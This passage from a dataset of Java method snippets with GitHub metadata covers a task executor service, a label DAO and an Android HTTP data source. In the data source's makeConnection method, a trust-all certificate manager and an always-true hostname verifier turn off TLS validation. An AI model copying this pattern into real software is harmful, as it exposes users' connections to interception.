if(rsp.getCode() == 0){                    LOG.info(\"Notify task [{}] complete, success\",taskId);                }else{                    LOG.error(\"TASK_ERROR, notify task [{}] complete error, message {}\", taskId, rsp.getMessage());                }            });            if(!jobContainerManager.addContainer(taskId,  new JobContainer(newJobExecutor))){                return true;            }            addHooksToJobExecutor(newJobExecutor);            //set resourceManager            newJobExecutor.setResourceManager(resourceManager);            LOG.trace(\"Task jobId [{}], taskId [{}] has started to init\", jobId, taskId);            try {                newJobExecutor.init();            }catch(Exception e){                newJobExecutor.clean();                throw e;            }            newJobExecutor.start();            //allocate actually            LOG.trace(\"Waiting for allocating resource for taskId [{}]\", taskId);            if(newJobExecutor.waitForAlloc(configuration.getWaitAllocTimeInSec(), TimeUnit.SECONDS)){                //CN: \u4efb\u52a1\u8c03\u5ea6\u6210\u529f\uff0c\u8fd4\u56de                LOG.info(\"Allocate task success, jobId:[{}], taskId:[{}]\", new Object[]{jobId, taskId});                return true;            }else{                LOG.trace(\"Allocate task failed., jobId: [{}], taskId: [{}], reason: cannot allocate resource\", jobId, taskId);                throw new TaskResAllocException(\"task: [\"+ taskId +\"] allocate resource failed\");            }        } catch (Exception e) {            jobContainerManager.removeContainer(taskId);            if(e instanceof TaskResAllocException){                throw (TaskResAllocException)e;            }            LOG.error(\"Scheduler task failed., jobId: [\" + jobId + \"], taskId: [\" + taskId +\"]\");            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "kill", "params": ["long", "long"], "throws": null, "modifiers": ["public"], "return_type": "Response<String>", "snippet": "    public Response<String> kill(long jobId, long taskId) {        return OperateBarrier.operate(String.valueOf(taskId), () ->{            LOG.info(\"Kill job {},task {}\", jobId, taskId);            if(killIfExist(jobId, taskId)){                return new Response<String>().successResponse(\"success\");            }else{                LOG.info(\"Job {},task {},is not exist\", jobId, taskId);                isAlive(jobId, taskId);                return new Response<String>().errorResponse(501, null, \"job \" + jobId + \",task \" + taskId + \",is not exist\");            }        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "getJobContainer", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "JobContainer", "snippet": "    public JobContainer getJobContainer(Object containerId) {        return jobContainerManager.getContainer(containerId);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "log", "params": ["long", "long", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "LogResult", "snippet": "    public LogResult log(long jobId, long taskId, int startLine, int windSize) {        JobContainer jobContainer = jobContainerManager.getContainer(taskId);        if(null != jobContainer){            return jobContainer.getRuntime().log(startLine, windSize);        }        //history log        DefaultLocalTaskLog taskLog = new DefaultLocalTaskLog(new File(this.configuration.getJobLogHistory(), jobId + \"_\" + taskId + \".log\"));        return taskLog.fetchLog(startLine, windSize);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "isAlive", "params": ["long", "long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAlive(long jobId, long taskId) {        return OperateBarrier.operate(String.valueOf(taskId), () -> {            LOG.info(\"Check if is alive. jobId: {}, taskId: {}\", jobId, taskId);            JobContainer jobContainer = jobContainerManager.getContainer(taskId);            if(null == jobContainer){                //TODO choose the process                AbstractJavaInternalTaskProcess process = new DataxTaskProcess(jobId, taskId,                        null,TaskConfiguration.from(\"{}\"), configuration, new HashMap<>());                //clean the work directory                process.clean();                return false;            }            return true;        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "killIfExist", "params": ["long", "long"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean killIfExist(long jobId, long taskId){        JobContainer container = jobContainerManager.getContainer(taskId);        boolean exists = container != null;        if (exists) {            container.getRuntime().toStop();        }        return exists;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "addHooksToJobExecutor", "params": ["JobExecutor"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addHooksToJobExecutor(JobExecutor newJobExecutor){        //add timeout hook        newJobExecutor.addHook(JobExecutor.Hook.TASK_TIMEOUT, (taskProcess, message)->{            long jobId = TaskProcessUtils.getJobId(taskProcess);            long taskId = TaskProcessUtils.getTaskId(taskProcess);            LOG.info(\"Task jobId [{}],taskId [{}] timeout ,message {}\", jobId, taskId, message);            Response<String> rsp = callBackService.notifyTaskTimeout(taskId, message);            if(rsp.getCode() == 0){                LOG.info(\"Notify task [{}] timeout, success\", taskId);            }else{                LOG.error(\"Notify task [{}] timeout error, message {}\", taskId, rsp.getMessage());            }        });        //add hook to remove container when the task ends        newJobExecutor.addHook(JobExecutor.Hook.TASK_END, (taskProcess, message) ->                jobContainerManager.removeContainer(TaskProcessUtils.getTaskId(taskProcess)));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "getAllLabelsByUserId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "List<Label>", "snippet": "    public List<Label> getAllLabelsByUserId(int userId) {        List<Label> list = JdbcTemplate.query(SqlMappers.LabelSqlMapper.get(\"getAllLabelsByUserId\"),new BeanPropertyRowMapper<Label>(Label.class),userId);        return list;    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "addLabel", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addLabel(String label, int user_id) {        JdbcTemplate.update(SqlMappers.LabelSqlMapper.get(\"addLabel\"),user_id,label);    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "deleteLabel", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteLabel(String label, int user_id) {        JdbcTemplate.update(SqlMappers.LabelSqlMapper.get(\"deleteLabel\"),user_id,label);    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "updateLabel", "params": ["String", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLabel(String oldLabel, String newLabel, int user_id) {        JdbcTemplate.update(SqlMappers.LabelSqlMapper.get(\"updateLabel\"),newLabel,oldLabel,user_id);    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "getLabel", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "Label", "snippet": "    public Label getLabel(String label, int user_id) {       List<Label> list = JdbcTemplate.query(SqlMappers.LabelSqlMapper.get(\"getLabel\"),new BeanPropertyRowMapper<Label>(Label.class),user_id,label);        if(list.size() == 0){            return null;        }        return list.get(0);    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "getArticleLabel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getArticleLabel(int article_id) {        List<Article> list = JdbcTemplate.query(SqlMappers.LabelSqlMapper.get(\"getArticleLabel\"),new BeanPropertyRowMapper<Article>(Article.class),article_id);        if(list.size() == 0){            return null;        }        return list.get(0).getArticle_tag();    }", "url": "https://raw.githubusercontent.com/373675032/Molihub/master/src/dao/impl/LabelDaoImpl.java", "stars": "10", "class": {"name": "LabelDaoImpl", "extends": "BaseDaoImpl", "implements": ["LabelDao"], "modifiers": ["public"]}}, {"method_name": "getUri", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Uri", "snippet": "    Uri getUri() {        return connection == null ? null : Uri.parse(connection.getURL().toString());    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "getResponseHeaders", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,List>", "snippet": "    public Map<String, List<String>> getResponseHeaders() {        return connection == null ? new HashMap<String, List<String>>() : connection.getHeaderFields();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "setRequestProperty", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRequestProperty(String name, String value) {        Assertions.checkNotNull(name);        Assertions.checkNotNull(value);        requestProperties.set(name, value);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "clearRequestProperty", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearRequestProperty(String name) {        Assertions.checkNotNull(name);        requestProperties.remove(name);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "clearAllRequestProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearAllRequestProperties() {        requestProperties.clear();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "open", "params": ["DataSpec"], "throws": ["HttpDataSourceException"], "modifiers": ["public"], "return_type": "long", "snippet": "    public long open(DataSpec dataSpec) throws HttpDataSourceException {        this.dataSpec = dataSpec;        this.bytesRead = 0;        this.bytesSkipped = 0;        transferInitializing(dataSpec);        try {            connection = makeConnection(dataSpec);        } catch (IOException e) {            throw new HttpDataSourceException(\"Unable to connect to \" + dataSpec.uri.toString(), e,                    dataSpec, HttpDataSourceException.TYPE_OPEN);        }        int responseCode;        String responseMessage;        try {            responseCode = connection.getResponseCode();            responseMessage = connection.getResponseMessage();        } catch (IOException e) {            closeConnectionQuietly();            throw new HttpDataSourceException(\"Unable to connect to \" + dataSpec.uri.toString(), e,                    dataSpec, HttpDataSourceException.TYPE_OPEN);        }        // Check for a valid response code.        if (responseCode < 200 || responseCode > 299) {            Map<String, List<String>> headers = connection.getHeaderFields();            closeConnectionQuietly();            InvalidResponseCodeException exception =                    new InvalidResponseCodeException(responseCode, responseMessage, headers, dataSpec);            if (responseCode == 416) {                exception.initCause(new DataSourceException(DataSourceException.POSITION_OUT_OF_RANGE));            }            throw exception;        }        // Check for a valid content type.        String contentType = connection.getContentType();        if (contentTypePredicate != null && !contentTypePredicate.evaluate(contentType)) {            closeConnectionQuietly();            throw new InvalidContentTypeException(contentType, dataSpec);        }        // If we requested a range starting from a non-zero position and received a 200 rather than a        // 206, then the server does not support partial requests. We'll need to manually skip to the        // requested position.        bytesToSkip = responseCode == 200 && dataSpec.position != 0 ? dataSpec.position : 0;        // Determine the length of the data to be read, after skipping.        if (!dataSpec.isFlagSet(DataSpec.FLAG_ALLOW_GZIP)) {            if (dataSpec.length != C.LENGTH_UNSET) {                bytesToRead = dataSpec.length;            } else {                long contentLength = getContentLength(connection);                bytesToRead = contentLength != C.LENGTH_UNSET ? (contentLength - bytesToSkip)                        : C.LENGTH_UNSET;            }        } else {            // Gzip is enabled. If the server opts to use gzip then the content length in the response            // will be that of the compressed data, which isn't what we want. Furthermore, there isn't a            // reliable way to determine whether the gzip was used or not. Always use the dataSpec length            // in this case.            bytesToRead = dataSpec.length;        }        try {            inputStream = connection.getInputStream();        } catch (IOException e) {            closeConnectionQuietly();            throw new HttpDataSourceException(e, dataSpec, HttpDataSourceException.TYPE_OPEN);        }        opened = true;        transferStarted(dataSpec);        return bytesToRead;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "read", "params": ["byte", "int", "int"], "throws": ["HttpDataSourceException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int read(byte[] buffer, int offset, int readLength) throws HttpDataSourceException {        try {            skipInternal();            return readInternal(buffer, offset, readLength);        } catch (IOException e) {            throw new HttpDataSourceException(e, dataSpec, HttpDataSourceException.TYPE_READ);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": ["HttpDataSourceException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws HttpDataSourceException {        try {            if (inputStream != null) {                maybeTerminateInputStream(connection, bytesRemaining());                try {                    inputStream.close();                } catch (IOException e) {                    throw new HttpDataSourceException(e, dataSpec, HttpDataSourceException.TYPE_CLOSE);                }            }        } finally {            inputStream = null;            closeConnectionQuietly();            if (opened) {                opened = false;                transferEnded();            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "HttpURLConnection", "snippet": "    HttpURLConnection getConnection() {        return connection;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "bytesSkipped", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "long", "snippet": "    protected final long bytesSkipped() {        return bytesSkipped;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "bytesRead", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "long", "snippet": "    protected final long bytesRead() {        return bytesRead;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "bytesRemaining", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "long", "snippet": "    protected final long bytesRemaining() {        return bytesToRead == C.LENGTH_UNSET ? bytesToRead : bytesToRead - bytesRead;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "makeConnection", "params": ["DataSpec"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "HttpURLConnection", "snippet": "    private HttpURLConnection makeConnection(DataSpec dataSpec) throws IOException {        URL url = new URL(dataSpec.uri.toString());        @HttpMethod int httpMethod = dataSpec.httpMethod;        byte[] httpBody = dataSpec.httpBody;        long position = dataSpec.position;        long length = dataSpec.length;        boolean allowGzip = dataSpec.isFlagSet(DataSpec.FLAG_ALLOW_GZIP);        if (!allowCrossProtocolRedirects) {            // HttpURLConnection disallows cross-protocol redirects, but otherwise performs redirection            // automatically. This is the behavior we want, so use it.            return makeConnection(                    url, httpMethod, httpBody, position, length, allowGzip, true /* followRedirects */);        }        // We need to handle redirects ourselves to allow cross-protocol redirects.        int redirectCount = 0;        while (redirectCount++ <= MAX_REDIRECTS) {            HttpURLConnection connection =                    makeConnection(                            url, httpMethod, httpBody, position, length, allowGzip, false /* followRedirects */);            int responseCode = connection.getResponseCode();            String location = connection.getHeaderField(\"Location\");            if ((httpMethod == DataSpec.HTTP_METHOD_GET || httpMethod == DataSpec.HTTP_METHOD_HEAD)                    && (responseCode == HttpURLConnection.HTTP_MULT_CHOICE                    || responseCode == HttpURLConnection.HTTP_MOVED_PERM                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT)) {                connection.disconnect();                url = handleRedirect(url, location);            } else if (httpMethod == DataSpec.HTTP_METHOD_POST                    && (responseCode == HttpURLConnection.HTTP_MULT_CHOICE                    || responseCode == HttpURLConnection.HTTP_MOVED_PERM                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER)) {                // POST request follows the redirect and is transformed into a GET request.                connection.disconnect();                httpMethod = DataSpec.HTTP_METHOD_GET;                httpBody = null;                url = handleRedirect(url, location);            } else {                return connection;            }        }        // If we get here we've been redirected more times than are permitted.        throw new NoRouteToHostException(\"Too many redirects: \" + redirectCount);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "makeConnection", "params": ["URL", "int", "byte", "long", "long", "boolean", "boolean"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "HttpURLConnection", "snippet": "    private HttpURLConnection makeConnection(            URL url,            @HttpMethod int httpMethod,            byte[] httpBody,            long position,            long length,            boolean allowGzip,            boolean followRedirects)            throws IOException {        HttpURLConnection connection;        if(url.getProtocol().endsWith(\"https\")) {            /**\u53bb\u9664\u8bc1\u4e66\u9650\u5236**/            connection = (HttpsURLConnection) url.openConnection();            ((HttpsURLConnection) connection).setHostnameVerifier(new HostnameVerifier() {                @Override                public boolean verify(String hostname, SSLSession session) {                    return true;                }            });            // Create a trust manager that does not validate certificate chains            final TrustManager[] trustAllCerts = new TrustManager[]{                    new X509TrustManager() {                        @Override                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) throws CertificateException {                        }                        @Override                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) throws CertificateException {                        }                        @Override                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {                            return null;                        }                    }            };            // Install the all-trusting trust manager            final SSLContext sslContext;            try {                sslContext = SSLContext.getInstance(\"SSL\");                sslContext.init(null, trustAllCerts, new java.security.SecureRandom());                // Create an ssl socket factory with our all-trusting manager                final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();                ((HttpsURLConnection) connection).setSSLSocketFactory(sslSocketFactory);                ((HttpsURLConnection) connection).setHostnameVerifier(new HostnameVerifier() {                    @Override                    public boolean verify(String hostname, SSLSession session) {                        return true;                    }                });            } catch (NoSuchAlgorithmException e) {                e.printStackTrace();            } catch (KeyManagementException e) {                e.printStackTrace();            }            /**\u53bb\u9664\u8bc1\u4e66\u9650\u5236**/        } else  {            connection = (HttpURLConnection) url.openConnection();        }        connection.setConnectTimeout(connectTimeoutMillis);        connection.setReadTimeout(readTimeoutMillis);        if (defaultRequestProperties != null) {            for (Map.Entry<String, String> property : defaultRequestProperties.getSnapshot().entrySet()) {                connection.setRequestProperty(property.getKey(), property.getValue());            }        }        for (Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {            connection.setRequestProperty(property.getKey(), property.getValue());        }        if (!(position == 0 && length == C.LENGTH_UNSET)) {            String rangeRequest = \"bytes=\" + position + \"-\";            if (length != C.LENGTH_UNSET) {                rangeRequest += (position + length - 1);            }            connection.setRequestProperty(\"Range\", rangeRequest);        }        connection.setRequestProperty(\"User-Agent\", userAgent);        if (!allowGzip) {            connection.setRequestProperty(\"Accept-Encoding\", \"identity\");        }        connection.setInstanceFollowRedirects(followRedirects);        connection.setDoOutput(httpBody != null);        connection.setRequestMethod(DataSpec.getStringForHttpMethod(httpMethod));        if (httpBody != null) {            connection.setFixedLengthStreamingMode(httpBody.length);            connection.connect();            OutputStream os = connection.getOutputStream();            os.write(httpBody);            os.close();        } else {            connection.connect();        }        return connection;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "handleRedirect", "params": ["URL", "String"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "URL", "snippet": "    private static URL handleRedirect(URL originalUrl, String location) throws IOException {        if (location == null) {            throw new ProtocolException(\"Null location redirect\");        }        // Form the new url.        URL url = new URL(originalUrl, location);        // Check that the protocol of the new url is supported.        String protocol = url.getProtocol();        if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {            throw new ProtocolException(\"Unsupported protocol redirect: \" + protocol);        }        // Currently this method is only called if allowCrossProtocolRedirects is true, and so the code        // below isn't required. If we ever decide to handle redirects ourselves when cross-protocol        // redirects are disabled, we'll need to uncomment this block of code.        // if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {        //   throw new ProtocolException(\"Disallowed cross-protocol redirect (\"        //       + originalUrl.getProtocol() + \" to \" + protocol + \")\");        // }        return url;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "getContentLength", "params": ["HttpURLConnection"], "throws": null, "modifiers": ["private", "static"], "return_type": "long", "snippet": "    private static long getContentLength(HttpURLConnection connection) {        long contentLength = C.LENGTH_UNSET;        String contentLengthHeader = connection.getHeaderField(\"Content-Length\");        if (!TextUtils.isEmpty(contentLengthHeader)) {            try {                contentLength = Long.parseLong(contentLengthHeader);            } catch (NumberFormatException e) {                Log.e(TAG, \"Unexpected Content-Length [\" + contentLengthHeader + \"]\");            }        }        String contentRangeHeader = connection.getHeaderField(\"Content-Range\");        if (!TextUtils.isEmpty(contentRangeHeader)) {            Matcher matcher = CONTENT_RANGE_HEADER.matcher(contentRangeHeader);            if (matcher.find()) {                try {                    long contentLengthFromRange =                            Long.parseLong(matcher.group(2)) - Long.parseLong(matcher.group(1)) + 1;                    if (contentLength < 0) {                        // Some proxy servers strip the Content-Length header. Fall back to the length                        // calculated here in this case.                        contentLength = contentLengthFromRange;                    } else if (contentLength != contentLengthFromRange) {                        // If there is a discrepancy between the Content-Length and Content-Range headers,                        // assume the one with the larger value is correct. We have seen cases where carrier                        // change one of them to reduce the size of a request, but it is unlikely anybody would                        // increase it.                        Log.w(TAG, \"Inconsistent headers [\" + contentLengthHeader + \"] [\" + contentRangeHeader                                + \"]\");                        contentLength = Math.max(contentLength, contentLengthFromRange);                    }                } catch (NumberFormatException e) {                    Log.e(TAG, \"Unexpected Content-Range [\" + contentRangeHeader + \"]\");                }            }        }        return contentLength;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "skipInternal", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void skipInternal() throws IOException {        if (bytesSkipped == bytesToSkip) {            return;        }        // Acquire the shared skip buffer.        byte[] skipBuffer = skipBufferReference.getAndSet(null);        if (skipBuffer == null) {            skipBuffer = new byte[4096];        }        while (bytesSkipped != bytesToSkip) {            int readLength = (int) Math.min(bytesToSkip - bytesSkipped, skipBuffer.length);            int read = inputStream.read(skipBuffer, 0, readLength);            if (Thread.currentThread().isInterrupted()) {                throw new InterruptedIOException();            }            if (read == -1) {                throw new EOFException();            }            bytesSkipped += read;            bytesTransferred(read);        }        // Release the shared skip buffer.        skipBufferReference.set(skipBuffer);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "readInternal", "params": ["byte", "int", "int"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "int", "snippet": "    private int readInternal(byte[] buffer, int offset, int readLength) throws IOException {        if (readLength == 0) {            return 0;        }        if (bytesToRead != C.LENGTH_UNSET) {            long bytesRemaining = bytesToRead - bytesRead;            if (bytesRemaining == 0) {                return C.RESULT_END_OF_INPUT;            }            readLength = (int) Math.min(readLength, bytesRemaining);        }        int read = inputStream.read(buffer, offset, readLength);        if (read == -1) {            if (bytesToRead != C.LENGTH_UNSET) {                // End of stream reached having not read sufficient data.                throw new EOFException();            }            return C.RESULT_END_OF_INPUT;        }        bytesRead += read;        bytesTransferred(read);        return read;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "maybeTerminateInputStream", "params": ["HttpURLConnection", "long"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {        if (Util.SDK_INT != 19 && Util.SDK_INT != 20) {            return;        }        try {            InputStream inputStream = connection.getInputStream();            if (bytesRemaining == C.LENGTH_UNSET) {                // If the input stream has already ended, do nothing. The socket may be re-used.                if (inputStream.read() == -1) {                    return;                }            } else if (bytesRemaining <= MAX_BYTES_TO_DRAIN) {                // There isn't much data left. Prefer to allow it to drain, which may allow the socket to be                // re-used.                return;            }            String className = inputStream.getClass().getName();            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\"                    .equals(className)) {                Class<?> superclass = inputStream.getClass().getSuperclass();                Method unexpectedEndOfInput = superclass.getDeclaredMethod(\"unexpectedEndOfInput\");                unexpectedEndOfInput.setAccessible(true);                unexpectedEndOfInput.invoke(inputStream);            }        } catch (Exception e) {            // If an IOException then the connection didn't ever have an input stream, or it was closed            // already. If another type of exception 